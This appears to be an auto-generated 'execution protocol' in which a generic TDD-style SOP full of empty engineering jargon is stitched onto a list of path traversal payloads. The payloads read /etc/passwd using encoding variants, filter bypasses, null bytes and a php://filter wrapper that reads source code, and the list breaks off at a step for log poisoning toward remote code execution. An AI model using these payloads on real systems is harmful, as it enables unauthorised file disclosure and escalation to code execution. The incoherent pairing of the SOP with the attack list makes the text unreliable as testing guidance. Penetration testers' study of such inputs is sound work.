# Phase 9 Testing Methodology: Execution Protocol

## ⚙️ Overview
This protocol defines the exact standards for implementing Phase 9 Testing Methodology. By following this strict operational pattern, the engine guarantees deterministic execution, high performance, and complete adherence to all architectural guardrails established by the system design.

## 🛠️ Implementation SOP
Follow this step-by-step TDD procedure to execute the protocol:

- **Step 1: Baseline Context**: Verify the operational environment. Ensure required tools (like Python, Node, TS, or native CLI) are accessible before injecting new logic.
- **Step 2: Apply the Pattern**: Implement the core phase 9 testing methodology logic directly into the active system context.
- **Step 3: Enforce Constraints**: Check for syntax errors, injection vulnerabilities, and performance bottlenecks (`O(1)` compliance).
- **Step 4: Execute Test Suite**: Run `npm run test` or the local testing framework to ensure the logic passes all regression checks.
- **Step 5: Document and Commit**: Update the session walkthrough and sync the telemetry logs for the engineering sector.

# Phase 9: Testing Methodology

Structured testing approach:

```bash
# Step 1: Identify potential parameters
# Look for file-related functionality

# Step 2: Test basic traversal
../../../etc/passwd

# Step 3: Test encoding variations
..%2F..%2F..%2Fetc%2Fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

# Step 4: Test bypass techniques
....//....//....//etc/passwd
..;/..;/..;/etc/passwd

# Step 5: Test absolute paths
/etc/passwd

# Step 6: Test with null bytes (legacy)
../../../etc/passwd%00.jpg

# Step 7: Attempt wrapper exploitation
php://filter/convert.base64-encode/resource=index.php

# Step 8: Attempt log poisoning for RCE
